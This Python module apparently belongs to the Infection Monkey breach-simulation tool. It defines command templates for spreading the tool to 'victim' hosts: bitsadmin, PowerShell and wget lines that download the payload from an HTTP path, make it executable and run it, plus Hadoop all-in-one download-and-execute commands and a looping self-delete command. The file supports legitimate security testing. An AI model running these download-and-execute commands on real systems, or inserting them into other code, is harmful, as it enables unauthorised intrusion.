from infection_monkey.model.host import VictimHost  # noqa: F401

__author__ = 'itamar'

MONKEY_ARG = "m0nk3y"
DROPPER_ARG = "dr0pp3r"
ID_STRING = "M0NK3Y3XPL0ITABLE"

# CMD prefix for windows commands
CMD_PREFIX = "cmd.exe /c"
DROPPER_CMDLINE_WINDOWS = '%s %%(dropper_path)s %s' % (CMD_PREFIX, DROPPER_ARG,)
MONKEY_CMDLINE_WINDOWS = '%s %%(monkey_path)s %s' % (CMD_PREFIX, MONKEY_ARG,)
MONKEY_CMDLINE_LINUX = './%%(monkey_filename)s %s' % (MONKEY_ARG,)
GENERAL_CMDLINE_LINUX = '(cd %(monkey_directory)s && %(monkey_commandline)s)'
DROPPER_CMDLINE_DETACHED_WINDOWS = '%s start cmd /c %%(dropper_path)s %s' % (CMD_PREFIX, DROPPER_ARG,)
MONKEY_CMDLINE_DETACHED_WINDOWS = '%s start cmd /c %%(monkey_path)s %s' % (CMD_PREFIX, MONKEY_ARG,)
MONKEY_CMDLINE_HTTP = '%s /c "bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s' \
                      '&cmd /c %%(monkey_path)s %s"' % (CMD_PREFIX, MONKEY_ARG,)
DELAY_DELETE_CMD = 'cmd /c (for /l %%i in (1,0,2) do (ping -n 60 127.0.0.1 & del /f /q %(file_path)s & ' \
                        'if not exist %(file_path)s exit)) > NUL 2>&1 '

# Commands used for downloading monkeys
POWERSHELL_HTTP_UPLOAD = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \'%(http_path)s\' -OutFile \'%(" \
                         "monkey_path)s\' -UseBasicParsing\" "
WGET_HTTP_UPLOAD = "wget -O %(monkey_path)s %(http_path)s"
BITSADMIN_CMDLINE_HTTP = 'bitsadmin /transfer Update /download /priority high %(http_path)s %(monkey_path)s'
CHMOD_MONKEY = "chmod +x %(monkey_path)s"
RUN_MONKEY = " %(monkey_path)s %(monkey_type)s %(parameters)s"
# Commands used to check for architecture and if machine is exploitable
CHECK_COMMAND = "echo %s" % ID_STRING
# Architecture checking commands
GET_ARCH_WINDOWS = "wmic os get osarchitecture"
GET_ARCH_LINUX = "lscpu"

# All in one commands (upload, change permissions, run)
HADOOP_WINDOWS_COMMAND = "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { " \
                         "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; " \
                         " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) " \
                         "{& %(monkey_path)s %(monkey_type)s %(parameters)s }  \""
HADOOP_LINUX_COMMAND = "! [ -f %(monkey_path)s ] " \
                       "&& wget -O %(monkey_path)s %(http_path)s " \
                       "; chmod +x %(monkey_path)s " \
                       "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"

DOWNLOAD_TIMEOUT = 180
